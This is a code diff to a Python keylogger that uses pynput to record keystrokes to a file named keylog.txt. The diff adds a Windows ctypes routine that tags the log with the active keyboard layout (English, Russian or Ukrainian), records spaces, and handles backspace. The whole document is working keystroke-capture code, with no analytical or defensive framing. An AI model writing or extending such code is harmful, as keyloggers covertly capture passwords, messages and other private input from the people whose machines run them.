@@ -1,4 +1,5 @@
 from pynput.keyboard import Key, KeyCode, Listener
+from ctypes import *
 
 def write_line():
     global line
@@ -6,6 +7,19 @@ def write_line():
     fp.write(line)
     fp.close()
     line = ''
+
+def get_lang():
+    user32 = windll.user32
+    hwnd = user32.GetForegroundWindow()
+    threadID = user32.GetWindowThreadProcessId(hwnd, None)
+    CodeLang = hex(user32.GetKeyboardLayout(threadID))
+    if CodeLang == '0x4090409':
+        return 'En'
+    if CodeLang == '0x4190419':
+        return 'Ru'
+    if CodeLang == '-0xf57fbde':
+        return 'Ua'
+    return str(CodeLang)
 
 def get_key_name(key):
     if isinstance(key, KeyCode):
@@ -22,10 +36,12 @@ def on_press(key):
         return False
     elif key == Key.backspace:
         line = line[:-1]
+    elif key == Key.space:
+        line += ' '
     else:
         line += get_key_name(key)
 
-line = ''
+line = '[[' + get_lang() + ']]'
 fp=open("keylog.txt","w")
 fp.write(line)
 fp.close()
